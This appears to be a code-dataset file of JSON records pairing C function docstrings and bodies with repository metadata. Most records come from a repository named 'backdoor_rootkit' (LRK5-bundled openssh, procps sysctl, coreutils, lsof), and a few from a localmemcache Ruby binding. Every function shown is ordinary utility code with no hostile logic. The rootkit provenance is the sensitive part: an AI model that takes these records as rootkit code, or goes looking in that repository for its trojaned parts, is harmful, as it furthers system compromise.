{"docstring": "/* Fatal messages.  This function never returns. */\n", "func_signal": "void\nfatal(const char *fmt,...)", "code": "{\n\tva_list args;\n\tva_start(args, fmt);\n\tdo_log(SYSLOG_LEVEL_FATAL, fmt, args);\n\tva_end(args);\n\tcleanup_exit(255);\n}", "path": "rootkit_lrk5\\openssh-4.3p2\\fatal.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/*\n *     Strip the leading and trailing spaces from a string\n *\n */\n", "func_signal": "static char *StripLeadingAndTrailingSpaces(char *oneline)", "code": "{\n   char *t;\n\n   if (!oneline || !*oneline)\n      return oneline;\n\n   t = oneline;\n   t += strlen(oneline)-1;\n\n   while ((*t==' ' || *t=='\\t' || *t=='\\n' || *t=='\\r') && t!=oneline)\n      *t-- = 0;\n\n   t = oneline;\n\n   while ((*t==' ' || *t=='\\t') && *t!=0)\n      t++;\n\n   return t;\n}", "path": "rootkit_lrk5\\procps-3.2.8\\sysctl.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/* Allocate zeroed memory for N elements of S bytes, with error\n   checking.  S must be nonzero.  */\n", "func_signal": "void *\nxcalloc (size_t n, size_t s)", "code": "{\n  void *p;\n  /* Test for overflow, since some calloc implementations don't have\n     proper overflow checks.  */\n  if (xalloc_oversized (n, s) || ! (p = calloc (n, s)))\n    xalloc_die ();\n  return p;\n}", "path": "rootkit_lrk5\\coreutils-5.2.1\\lib\\xmalloc.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/*\n * Convert a string to an unsigned long integer.\n *\n * Ignores `locale' stuff.  Assumes that the upper and lower case\n * alphabets and digits are each contiguous.\n */\n", "func_signal": "unsigned long\nstrtoul(const char *nptr, char **endptr, int base)", "code": "{\n\tconst char *s;\n\tunsigned long acc, cutoff;\n\tint c;\n\tint neg, any, cutlim;\n\n\t/*\n\t * See strtol for comments as to the logic used.\n\t */\n\ts = nptr;\n\tdo {\n\t\tc = (unsigned char) *s++;\n\t} while (isspace(c));\n\tif (c == '-') {\n\t\tneg = 1;\n\t\tc = *s++;\n\t} else {\n\t\tneg = 0;\n\t\tif (c == '+')\n\t\t\tc = *s++;\n\t}\n\tif ((base == 0 || base == 16) &&\n\t    c == '0' && (*s == 'x' || *s == 'X')) {\n\t\tc = s[1];\n\t\ts += 2;\n\t\tbase = 16;\n\t}\n\tif (base == 0)\n\t\tbase = c == '0' ? 8 : 10;\n\n\tcutoff = ULONG_MAX / (unsigned long)base;\n\tcutlim = ULONG_MAX % (unsigned long)base;\n\tfor (acc = 0, any = 0;; c = (unsigned char) *s++) {\n\t\tif (isdigit(c))\n\t\t\tc -= '0';\n\t\telse if (isalpha(c))\n\t\t\tc -= isupper(c) ? 'A' - 10 : 'a' - 10;\n\t\telse\n\t\t\tbreak;\n\t\tif (c >= base)\n\t\t\tbreak;\n\t\tif (any < 0)\n\t\t\tcontinue;\n\t\tif (acc > cutoff || acc == cutoff && c > cutlim) {\n\t\t\tany = -1;\n\t\t\tacc = ULONG_MAX;\n\t\t\terrno = ERANGE;\n\t\t} else {\n\t\t\tany = 1;\n\t\t\tacc *= (unsigned long)base;\n\t\t\tacc += c;\n\t\t}\n\t}\n\tif (neg && any > 0)\n\t\tacc = -acc;\n\tif (endptr != 0)\n\t\t*endptr = (char *) (any ? s - 1 : nptr);\n\treturn (acc);\n}", "path": "rootkit_lrk5\\openssh-4.3p2\\openbsd-compat\\strtoul.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/*\n * vis - visually encode characters\n */\n", "func_signal": "char *\nvis(char *dst, int c, int flag, int nextc)", "code": "{\n\tif (isvisible(c)) {\n\t\t*dst++ = c;\n\t\tif (c == '\\\\' && (flag & VIS_NOSLASH) == 0)\n\t\t\t*dst++ = '\\\\';\n\t\t*dst = '\\0';\n\t\treturn (dst);\n\t}\n\n\tif (flag & VIS_CSTYLE) {\n\t\tswitch(c) {\n\t\tcase '\\n':\n\t\t\t*dst++ = '\\\\';\n\t\t\t*dst++ = 'n';\n\t\t\tgoto done;\n\t\tcase '\\r':\n\t\t\t*dst++ = '\\\\';\n\t\t\t*dst++ = 'r';\n\t\t\tgoto done;\n\t\tcase '\\b':\n\t\t\t*dst++ = '\\\\';\n\t\t\t*dst++ = 'b';\n\t\t\tgoto done;\n\t\tcase '\\a':\n\t\t\t*dst++ = '\\\\';\n\t\t\t*dst++ = 'a';\n\t\t\tgoto done;\n\t\tcase '\\v':\n\t\t\t*dst++ = '\\\\';\n\t\t\t*dst++ = 'v';\n\t\t\tgoto done;\n\t\tcase '\\t':\n\t\t\t*dst++ = '\\\\';\n\t\t\t*dst++ = 't';\n\t\t\tgoto done;\n\t\tcase '\\f':\n\t\t\t*dst++ = '\\\\';\n\t\t\t*dst++ = 'f';\n\t\t\tgoto done;\n\t\tcase ' ':\n\t\t\t*dst++ = '\\\\';\n\t\t\t*dst++ = 's';\n\t\t\tgoto done;\n\t\tcase '\\0':\n\t\t\t*dst++ = '\\\\';\n\t\t\t*dst++ = '0';\n\t\t\tif (isoctal(nextc)) {\n\t\t\t\t*dst++ = '0';\n\t\t\t\t*dst++ = '0';\n\t\t\t}\n\t\t\tgoto done;\n\t\t}\n\t}\n\tif (((c & 0177) == ' ') || (flag & VIS_OCTAL) ||\n\t    ((flag & VIS_GLOB) && (c == '*' || c == '?' || c == '[' || c == '#'))) {\n\t\t*dst++ = '\\\\';\n\t\t*dst++ = ((u_char)c >> 6 & 07) + '0';\n\t\t*dst++ = ((u_char)c >> 3 & 07) + '0';\n\t\t*dst++ = ((u_char)c & 07) + '0';\n\t\tgoto done;\n\t}\n\tif ((flag & VIS_NOSLASH) == 0)\n\t\t*dst++ = '\\\\';\n\tif (c & 0200) {\n\t\tc &= 0177;\n\t\t*dst++ = 'M';\n\t}\n\tif (iscntrl((u_char)c)) {\n\t\t*dst++ = '^';\n\t\tif (c == 0177)\n\t\t\t*dst++ = '?';\n\t\telse\n\t\t\t*dst++ = c + '@';\n\t} else {\n\t\t*dst++ = '-';\n\t\t*dst++ = c;\n\t}\ndone:\n\t*dst = '\\0';\n\treturn (dst);\n}", "path": "rootkit_lrk5\\openssh-4.3p2\\openbsd-compat\\vis.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/*\n *     Write a sysctl setting \n *\n */\n", "func_signal": "static int WriteSetting(const char *setting)", "code": "{\n   int rc = 0;\n   const char *name = setting;\n   const char *value;\n   const char *equals;\n   char *tmpname;\n   FILE *fp;\n   char *outname;\n\n   if (!name) {        /* probably don't want to display this err */\n      return 0;\n   } /* end if */\n\n   equals = index(setting, '=');\n \n   if (!equals) {\n      fprintf(stderr, ERR_NO_EQUALS, setting);\n      return -1;\n   }\n\n   value = equals + 1;      /* point to the value in name=value */   \n\n   if (!*name || !*value || name == equals) { \n      fprintf(stderr, ERR_MALFORMED_SETTING, setting);\n      return -2;\n   }\n\n   /* used to open the file */\n   tmpname = malloc(equals-name+1+strlen(PROC_PATH));\n   strcpy(tmpname, PROC_PATH);\n   strncat(tmpname, name, (int)(equals-name)); \n   tmpname[equals-name+strlen(PROC_PATH)] = 0;\n   slashdot(tmpname+strlen(PROC_PATH),'.','/'); /* change . to / */\n\n   /* used to display the output */\n   outname = malloc(equals-name+1);                       \n   strncpy(outname, name, (int)(equals-name)); \n   outname[equals-name] = 0;\n   slashdot(outname,'/','.'); /* change / to . */\n \n   fp = fopen(tmpname, \"w\");\n\n   if (!fp) {\n      switch(errno) {\n      case ENOENT:\n         if (!IgnoreError) {\n            fprintf(stderr, ERR_INVALID_KEY, outname);\n            rc = -1;\n         }\n         break;\n      case EACCES:\n         fprintf(stderr, ERR_PERMISSION_DENIED, outname);\n         rc = -1;\n         break;\n      default:\n         fprintf(stderr, ERR_UNKNOWN_WRITING, strerror(errno), outname);\n         rc = -1;\n         break;\n      }\n   } else {\n      rc = fprintf(fp, \"%s\\n\", value);\n      if (rc < 0) {\n         fprintf(stderr, ERR_UNKNOWN_WRITING, strerror(errno), outname);\n         fclose(fp);\n      } else {\n         rc=fclose(fp);\n         if (rc != 0) \n            fprintf(stderr, ERR_UNKNOWN_WRITING, strerror(errno), outname);\n      }\n      if (rc==0 && !Quiet) {\n         if (NameOnly) {\n            fprintf(stdout, \"%s\\n\", outname);\n         } else {\n            if (PrintName) {\n               fprintf(stdout, \"%s = %s\\n\", outname, value);\n            } else {\n               if (PrintNewline)\n                  fprintf(stdout, \"%s\\n\", value);\n               else\n                  fprintf(stdout, \"%s\", value);\n            }\n         }\n      }\n   }\n\n   free(tmpname);\n   free(outname);\n   return rc;\n}", "path": "rootkit_lrk5\\procps-3.2.8\\sysctl.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/*\n *    Main... \n *\n */\n", "func_signal": "int main(int argc, char *argv[])", "code": "{\n   const char *me = (const char *)basename(argv[0]);\n   bool SwitchesAllowed = true;\n   bool WriteMode = false;\n   int ReturnCode = 0;\n   const char *preloadfile = DEFAULT_PRELOAD;\n\n   PrintName = true;\n   PrintNewline = true;\n   IgnoreError = false;\n   Quiet = false;\n\n   if (argc < 2) {\n       return Usage(me);\n   }\n\n   argv++;\n\n   for (; argv && *argv && **argv; argv++) {\n      if (SwitchesAllowed && **argv == '-') {        /* we have a switch */\n         if ((*argv)[1] && (*argv)[2]){       // don't yet handle \"sysctl -ew\"\n              if (!strcmp(\"--help\",*argv)) {\n                 Usage(me);\n                 exit(0);\n              }\n              if (!strcmp(\"--version\",*argv)) {\n                 fprintf(stdout, \"sysctl (%s)\\n\",procps_version);\n                 exit(0);\n              }\n              fprintf(stderr, ERR_UNKNOWN_PARAMETER, *argv);\n              return Usage(me);\n         }\n         switch((*argv)[1]) {\n         case 'b':\n              /* This is \"binary\" format, which means more for BSD. */\n              PrintNewline = false;\n           /* FALL THROUGH */\n         case 'n':\n              PrintName = false;\n           break;\n         case 'e':\n              // For FreeBSD, -e means a \"%s=%s\\n\" format. (\"%s: %s\\n\" default)\n              // We (and NetBSD) use \"%s = %s\\n\" always, and -e to ignore errors.\n              IgnoreError = true;\n           break;\n         case 'N':\n              NameOnly = true;\n           break;\n         case 'w':\n              SwitchesAllowed = false;\n              WriteMode = true;\n           break;\n         case 'f':  // the NetBSD way\n         case 'p':\n              argv++;\n              if (argv && *argv && **argv) {\n                 preloadfile = *argv;\n              }\n              return Preload(preloadfile);\n\t case 'q':\n\t      Quiet = true;\n\t   break;\n\t case 'o':  // BSD: binary values too, 1st 16 bytes in hex\n\t case 'x':  // BSD: binary values too, whole thing in hex\n\t      /* does nothing */ ;\n\t   break;\n         case 'a': // string and integer values (for Linux, all of them)\n         case 'A': // same as -a -o\n         case 'X': // same as -a -x\n              SwitchesAllowed = false;\n              return DisplayAll(PROC_PATH);\n         case 'V':\n              fprintf(stdout, \"sysctl (%s)\\n\",procps_version);\n              exit(0);\n         case 'd':   // BSD: print description (\"vm.kvm_size: Size of KVM\")\n         case 'h':   // BSD: human-readable (did FreeBSD 5 make -e default?)\n         case '?':\n              return Usage(me);\n         default:\n              fprintf(stderr, ERR_UNKNOWN_PARAMETER, *argv);\n              return Usage(me);\n         }\n      } else {\n         if (NameOnly && Quiet)   // nonsense\n            return Usage(me);\n         SwitchesAllowed = false;\n         if (WriteMode || index(*argv, '='))\n            ReturnCode = WriteSetting(*argv);\n         else\n            ReturnCode = ReadSetting(*argv);\n      }\n   }\n\n   return ReturnCode;\n}", "path": "rootkit_lrk5\\procps-3.2.8\\sysctl.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/*\n *     Read a sysctl setting \n *\n */\n", "func_signal": "static int ReadSetting(const char *restrict const name)", "code": "{\n   int rc = 0;\n   char *restrict tmpname;\n   char *restrict outname;\n   char inbuf[1025];\n   FILE *restrict fp;\n\n   if (!name || !*name) {\n      fprintf(stderr, ERR_INVALID_KEY, name);\n      return -1;\n   }\n\n   /* used to open the file */\n   tmpname = malloc(strlen(name)+strlen(PROC_PATH)+2);\n   strcpy(tmpname, PROC_PATH);\n   strcat(tmpname, name); \n   slashdot(tmpname+strlen(PROC_PATH),'.','/'); /* change . to / */\n\n   /* used to display the output */\n   outname = strdup(name);\n   slashdot(outname,'/','.'); /* change / to . */\n\n   fp = fopen(tmpname, \"r\");\n\n   if (!fp) {\n      switch(errno) {\n      case ENOENT:\n         if (!IgnoreError) {\n            fprintf(stderr, ERR_INVALID_KEY, outname);\n            rc = -1;\n         }\n         break;\n      case EACCES:\n         fprintf(stderr, ERR_PERMISSION_DENIED, outname);\n         rc = -1;\n         break;\n      default:\n         fprintf(stderr, ERR_UNKNOWN_READING, strerror(errno), outname);\n         rc = -1;\n         break;\n      }\n   } else {\n      if(fgets(inbuf, sizeof inbuf - 1, fp)) {\n         // this loop is required, see\n         // /sbin/sysctl -a | egrep -6 dev.cdrom.info\n         do {\n            if (NameOnly) {\n               fprintf(stdout, \"%s\\n\", outname);\n            } else {\n               /* already has the \\n in it */\n               if (PrintName) {\n                  fprintf(stdout, \"%s = %s\", outname, inbuf);\n               } else {\n                  if (!PrintNewline) {\n                    char *nlptr = strchr(inbuf,'\\n');\n                    if(nlptr) *nlptr='\\0';\n                  }\n                  fprintf(stdout, \"%s\", inbuf);\n               }\n            }\n         } while(fgets(inbuf, sizeof inbuf - 1, fp));\n      } else {\n         switch(errno) {\n         case EACCES:\n            fprintf(stderr, ERR_PERMISSION_DENIED, outname);\n            rc = -1;\n            break;\n         case EISDIR:{\n            size_t len;\n            len = strlen(tmpname);\n            tmpname[len] = '/';\n            tmpname[len+1] = '\\0';\n            rc = DisplayAll(tmpname);\n            break;\n         }\n         default:\n            fprintf(stderr, ERR_UNKNOWN_READING, strerror(errno), outname);\n            rc = -1;\n            break;\n         }\n      }\n      fclose(fp);\n   }\n\n   free(tmpname);\n   free(outname);\n   return rc;\n}", "path": "rootkit_lrk5\\procps-3.2.8\\sysctl.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/* Change the size of an allocated block of memory P to an array of N\n   objects each of S bytes, with error checking.  S must be nonzero.  */\n", "func_signal": "static inline void *\nxnrealloc_inline (void *p, size_t n, size_t s)", "code": "{\n  if (xalloc_oversized (n, s) || ! (p = realloc (p, n * s)))\n    xalloc_die ();\n  return p;\n}", "path": "rootkit_lrk5\\coreutils-5.2.1\\lib\\xmalloc.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/*\n *     Display all the sysctl settings \n *\n */\n", "func_signal": "static int DisplayAll(const char *restrict const path)", "code": "{\n   int rc = 0;\n   int rc2;\n   DIR *restrict dp;\n   struct dirent *restrict de;\n   struct stat ts;\n\n   dp = opendir(path);\n\n   if (!dp) {\n      fprintf(stderr, ERR_OPENING_DIR, path);\n      rc = -1;\n   } else {\n      readdir(dp);  // skip .\n      readdir(dp);  // skip ..\n      while (( de = readdir(dp) )) {\n         char *restrict tmpdir;\n         tmpdir = (char *restrict)malloc(strlen(path)+strlen(de->d_name)+2);\n         sprintf(tmpdir, \"%s%s\", path, de->d_name);\n         rc2 = stat(tmpdir, &ts);\n         if (rc2 != 0) {\n            perror(tmpdir);\n         } else {\n            if (S_ISDIR(ts.st_mode)) {\n               strcat(tmpdir, \"/\");\n               DisplayAll(tmpdir);\n            } else {\n               rc |= ReadSetting(tmpdir+strlen(PROC_PATH));\n            }\n         }\n         free(tmpdir);\n      }\n      closedir(dp);\n   }\n   return rc;\n}", "path": "rootkit_lrk5\\procps-3.2.8\\sysctl.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/*\n * clr_sect() - clear cached clone and pseudo sections\n */\n", "func_signal": "void\nclr_sect()", "code": "{\n\tif (Clone) {\n\t    struct clone *c, *c1;\n\n\t    for (c = Clone; c; c = c1) {\n\t\tc1 = c->next;\n\t\tif (c->cd.name)\n\t\t    (void) free((FREE_P *)c->cd.name);\n\t\t(void) free((FREE_P *)c);\n\t    }\n\t    Clone = (struct clone *)NULL;\n\t}\n\tif (Pseudo) {\n\t    struct pseudo *p, *p1;\n\n\t    for (p = Pseudo; p; p = p1) {\n\t\tp1 = p->next;\n\t\tif (p->pd.name)\n\t\t    (void) free((FREE_P *)p->pd.name);\n\t\t(void) free((FREE_P *)p);\n\t    }\n\t    Pseudo = (struct pseudo *)NULL;\n\t}\n}", "path": "rootkit_lrk5\\lsof-4.81.dfsg.1\\dialects\\sun\\ddev.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/*\n * rereaddev() - reread device names, modes and types\n */\n", "func_signal": "void\nrereaddev()", "code": "{\n\t(void) clr_devtab();\n\t(void) clr_sect();\n\tDevx = 0;\n\n# if\tdefined(DCACHE_CLR)\n\t(void) DCACHE_CLR();\n# endif\t/* defined(DCACHE_CLR) */\n\n\treaddev(1);\n\tDCunsafe = 0;\n}", "path": "rootkit_lrk5\\lsof-4.81.dfsg.1\\dialects\\sun\\ddev.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/*\n * Close all file descriptors greater than or equal to lowfd.\n */\n", "func_signal": "void\nclosefrom(int lowfd)", "code": "{\n    long fd, maxfd;\n#if defined(HAVE_DIRFD) && defined(HAVE_PROC_PID)\n    char fdpath[PATH_MAX], *endp;\n    struct dirent *dent;\n    DIR *dirp;\n    int len;\n\n    /* Check for a /proc/$$/fd directory. */\n    len = snprintf(fdpath, sizeof(fdpath), \"/proc/%ld/fd\", (long)getpid());\n    if (len >= 0 && (u_int)len <= sizeof(fdpath) && (dirp = opendir(fdpath))) {\n\twhile ((dent = readdir(dirp)) != NULL) {\n\t    fd = strtol(dent->d_name, &endp, 10);\n\t    if (dent->d_name != endp && *endp == '\\0' &&\n\t\tfd >= 0 && fd < INT_MAX && fd >= lowfd && fd != dirfd(dirp))\n\t\t(void) close((int) fd);\n\t}\n\t(void) closedir(dirp);\n    } else\n#endif\n    {\n\t/*\n\t * Fall back on sysconf() or getdtablesize().  We avoid checking\n\t * resource limits since it is possible to open a file descriptor\n\t * and then drop the rlimit such that it is below the open fd.\n\t */\n#ifdef HAVE_SYSCONF\n\tmaxfd = sysconf(_SC_OPEN_MAX);\n#else\n\tmaxfd = getdtablesize();\n#endif /* HAVE_SYSCONF */\n\tif (maxfd < 0)\n\t    maxfd = OPEN_MAX;\n\n\tfor (fd = lowfd; fd < maxfd; fd++)\n\t    (void) close((int) fd);\n    }\n}", "path": "rootkit_lrk5\\openssh-4.3p2\\openbsd-compat\\bsd-closefrom.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/* Provide a more-closely POSIX-conforming version of chown on\n   systems with one or both of the following problems:\n   - chown doesn't treat an ID of -1 as meaning\n   `don't change the corresponding ID'.\n   - chown doesn't dereference symlinks.  */\n", "func_signal": "int\nrpl_chown (const char *file, uid_t uid, gid_t gid)", "code": "{\n#if CHOWN_FAILS_TO_HONOR_ID_OF_NEGATIVE_ONE\n  if (gid == (gid_t) -1 || uid == (uid_t) -1)\n    {\n      struct stat file_stats;\n\n      /* Stat file to get id(s) that should remain unchanged.  */\n      if (stat (file, &file_stats))\n\treturn -1;\n\n      if (gid == (gid_t) -1)\n\tgid = file_stats.st_gid;\n\n      if (uid == (uid_t) -1)\n\tuid = file_stats.st_uid;\n    }\n#endif\n\n#if CHOWN_MODIFIES_SYMLINK\n  {\n    /* Handle the case in which the system-supplied chown function\n       does *not* follow symlinks.  Instead, it changes permissions\n       on the symlink itself.  To work around that, we open the\n       file (but this can fail due to lack of read or write permission) and\n       use fchown on the resulting descriptor.  */\n    int open_flags = O_NONBLOCK | O_NOCTTY;\n    int fd = open (file, O_RDONLY | open_flags);\n    if (0 <= fd\n\t|| (errno == EACCES\n\t    && 0 <= (fd = open (file, O_WRONLY | open_flags))))\n      {\n\tint result = fchown (fd, uid, gid);\n\tint saved_errno = errno;\n\n\t/* POSIX says fchown can fail with errno == EINVAL on sockets,\n\t   so fall back on chown in that case.  */\n\tstruct stat sb;\n\tbool fchown_socket_failure =\n\t  (result != 0 && saved_errno == EINVAL\n\t   && fstat (fd, &sb) == 0 && S_ISFIFO (sb.st_mode));\n\n\tclose (fd);\n\n\tif (! fchown_socket_failure)\n\t  {\n\t    errno = saved_errno;\n\t    return result;\n\t  }\n      }\n    else if (errno != EACCES)\n      return -1;\n  }\n#endif\n\n  return chown (file, uid, gid);\n}", "path": "rootkit_lrk5\\findutils-4.4.0\\gnulib\\lib\\chown.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/* Return the canonical absolute name of file NAME.  A canonical name\n   does not contain any `.', `..' components nor any repeated path\n   separators ('/') or symlinks.  All path components must exist.\n   The result is malloc'd.  */\n", "func_signal": "char *\ncanonicalize_file_name (const char *name)", "code": "{\n#if HAVE_RESOLVEPATH\n\n  char *resolved, *extra_buf = NULL;\n  size_t resolved_size;\n  ssize_t resolved_len;\n\n#else /* !HAVE_RESOLVEPATH */\n\n  char *rpath, *dest, *extra_buf = NULL;\n  const char *start, *end, *rpath_limit;\n  size_t extra_len = 0;\n  int num_links = 0;\n\n#endif /* !HAVE_RESOLVEPATH */\n\n  if (name == NULL)\n    {\n      __set_errno (EINVAL);\n      return NULL;\n    }\n\n  if (name[0] == '\\0')\n    {\n      __set_errno (ENOENT);\n      return NULL;\n    }\n\n#if HAVE_RESOLVEPATH\n\n  /* All known hosts with resolvepath (e.g. Solaris 7) don't turn\n     relative names into absolute ones, so prepend the working\n     directory if the path is not absolute.  */\n  if (name[0] != '/')\n    {\n      char *wd;\n\n      if (!(wd = xgetcwd ()))\n\treturn NULL;\n\n      extra_buf = path_concat (wd, name, NULL);\n      if (!extra_buf)\n\txalloc_die ();\n\n      name = extra_buf;\n      free (wd);\n    }\n\n  resolved_size = strlen (name);\n  while (1)\n    {\n      resolved_size = 2 * resolved_size + 1;\n      resolved = xmalloc (resolved_size);\n      resolved_len = resolvepath (name, resolved, resolved_size);\n      if (resolved_len < 0)\n\t{\n\t  free (resolved);\n\t  free (extra_buf);\n\t  return NULL;\n\t}\n      if (resolved_len < resolved_size)\n\tbreak;\n      free (resolved);\n    }\n\n  free (extra_buf);\n\n  /* NUL-terminate the resulting name.  */\n  resolved[resolved_len] = '\\0';\n\n  return resolved;\n\n#else /* !HAVE_RESOLVEPATH */\n\n  if (name[0] != '/')\n    {\n      rpath = xgetcwd ();\n      if (!rpath)\n\treturn NULL;\n      dest = strchr (rpath, '\\0');\n      if (dest - rpath < PATH_MAX)\n\t{\n\t  char *p = xrealloc (rpath, PATH_MAX);\n\t  dest = p + (dest - rpath);\n\t  rpath = p;\n\t  rpath_limit = rpath + PATH_MAX;\n\t}\n      else\n\t{\n\t  rpath_limit = dest;\n\t}\n    }\n  else\n    {\n      rpath = xmalloc (PATH_MAX);\n      rpath_limit = rpath + PATH_MAX;\n      rpath[0] = '/';\n      dest = rpath + 1;\n    }\n\n  for (start = end = name; *start; start = end)\n    {\n      /* Skip sequence of multiple path-separators.  */\n      while (*start == '/')\n\t++start;\n\n      /* Find end of path component.  */\n      for (end = start; *end && *end != '/'; ++end)\n\t/* Nothing.  */;\n\n      if (end - start == 0)\n\tbreak;\n      else if (end - start == 1 && start[0] == '.')\n\t/* nothing */;\n      else if (end - start == 2 && start[0] == '.' && start[1] == '.')\n\t{\n\t  /* Back up to previous component, ignore if at root already.  */\n\t  if (dest > rpath + 1)\n\t    while ((--dest)[-1] != '/');\n\t}\n      else\n\t{\n\t  struct stat st;\n\n\t  if (dest[-1] != '/')\n\t    *dest++ = '/';\n\n\t  if (dest + (end - start) >= rpath_limit)\n\t    {\n\t      PTR_INT_TYPE dest_offset = dest - rpath;\n\t      size_t new_size = rpath_limit - rpath;\n\n\t      if (end - start + 1 > PATH_MAX)\n\t\tnew_size += end - start + 1;\n\t      else\n\t\tnew_size += PATH_MAX;\n\t      rpath = xrealloc (rpath, new_size);\n\t      rpath_limit = rpath + new_size;\n\n\t      dest = rpath + dest_offset;\n\t    }\n\n\t  dest = memcpy (dest, start, end - start);\n\t  dest += end - start;\n\t  *dest = '\\0';\n\n\t  if (lstat (rpath, &st) < 0)\n\t    goto error;\n\n# ifdef S_ISLNK\n\t  if (S_ISLNK (st.st_mode))\n\t    {\n\t      char *buf;\n\t      size_t n, len;\n\n#  ifdef MAXSYMLINKS\n\t      if (++num_links > MAXSYMLINKS)\n\t\t{\n\t\t  __set_errno (ELOOP);\n\t\t  goto error;\n\t\t}\n#  endif /* MAXSYMLINKS */\n\n\t      buf = xreadlink (rpath);\n\t      if (!buf)\n\t\tgoto error;\n\n\t      n = strlen (buf);\n\t      len = strlen (end);\n\n\t      if (!extra_len)\n\t\t{\n\t\t  extra_len =\n\t\t    ((n + len + 1) > PATH_MAX) ? (n + len + 1) : PATH_MAX;\n\t\t  extra_buf = xmalloc (extra_len);\n\t\t}\n\t      else if ((n + len + 1) > extra_len)\n\t\t{\n\t\t  extra_len = n + len + 1;\n\t\t  extra_buf = xrealloc (extra_buf, extra_len);\n\t\t}\n\n\t      /* Careful here, end may be a pointer into extra_buf... */\n\t      memmove (&extra_buf[n], end, len + 1);\n\t      name = end = memcpy (extra_buf, buf, n);\n\n\t      if (buf[0] == '/')\n\t\tdest = rpath + 1;\t/* It's an absolute symlink */\n\t      else\n\t\t/* Back up to previous component, ignore if at root already: */\n\t\tif (dest > rpath + 1)\n\t\t  while ((--dest)[-1] != '/');\n\n\t      free (buf);\n\t    }\n# endif /* S_ISLNK */\n\t}\n    }\n  if (dest > rpath + 1 && dest[-1] == '/')\n    --dest;\n  *dest = '\\0';\n\n  free (extra_buf);\n  return rpath;\n\nerror:\n  free (extra_buf);\n  free (rpath);\n  return NULL;\n#endif /* !HAVE_RESOLVEPATH */\n}", "path": "rootkit_lrk5\\coreutils-5.2.1\\lib\\canonicalize.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/*\n * strvis, strnvis, strvisx - visually encode characters from src into dst\n *\t\n *\tDst must be 4 times the size of src to account for possible\n *\texpansion.  The length of dst, not including the trailing NULL,\n *\tis returned. \n *\n *\tStrnvis will write no more than siz-1 bytes (and will NULL terminate).\n *\tThe number of bytes needed to fully encode the string is returned.\n *\n *\tStrvisx encodes exactly len bytes from src into dst.\n *\tThis is useful for encoding a block of data.\n */\n", "func_signal": "int\nstrvis(char *dst, const char *src, int flag)", "code": "{\n\tchar c;\n\tchar *start;\n\n\tfor (start = dst; (c = *src);)\n\t\tdst = vis(dst, c, flag, *++src);\n\t*dst = '\\0';\n\treturn (dst - start);\n}", "path": "rootkit_lrk5\\openssh-4.3p2\\openbsd-compat\\vis.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/* Allocate an array of N objects, each with S bytes of memory,\n   dynamically, with error checking.  S must be nonzero.  */\n", "func_signal": "static inline void *\nxnmalloc_inline (size_t n, size_t s)", "code": "{\n  void *p;\n  if (xalloc_oversized (n, s) || ! (p = malloc (n * s)))\n    xalloc_die ();\n  return p;\n}", "path": "rootkit_lrk5\\coreutils-5.2.1\\lib\\xmalloc.c", "repo_name": "jingchunzhang/backdoor_rootkit", "stars": 85, "license": "None", "language": "c", "size": 11344}
{"docstring": "/* \n * internal, do not use\n */\n", "func_signal": "static VALUE LocalMemCache__check_consistency(VALUE obj)", "code": "{\n  lmc_error_t e;\n  rb_lmc_handle_t *h;\n  Data_Get_Struct(obj, rb_lmc_handle_t, h);\n  return local_memcache_check_consistency(rb_lmc_check_handle_access(h), &e) ? \n      Qtrue : Qfalse;\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* :nodoc: */\n", "func_signal": "static VALUE __LocalMemCache__keys(VALUE d)", "code": "{\n  VALUE obj = rb_ary_entry(d, 0);\n  VALUE r = rb_ary_entry(d, 1);\n  lmc_ruby_iter_collect_keys data;\n  data.ary = r;\n  int success = 2;\n  ht_iter_status_t s;\n  memset(&s, 0x0, sizeof(ht_iter_status_t));\n  while (success == 2) {\n    success = local_memcache_iterate(get_LocalMemCache(obj), \n        (void *) &data, &s, lmc_ruby_iter);\n  }\n  if (!success) { return Qnil; }\n  return Qnil;\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
{"docstring": "/* :nodoc: */\n", "func_signal": "int lmc_ruby_iter(void *ctx, const char* key, const char* value)", "code": "{\n  lmc_ruby_iter_collect_keys *data = ctx;\n  rb_ary_push(data->ary, lmc_ruby_string(key));\n  return 1;\n}", "path": "src\\ruby-binding\\rblocalmemcache.c", "repo_name": "sck/localmemcache", "stars": 120, "license": "other", "language": "c", "size": 543}
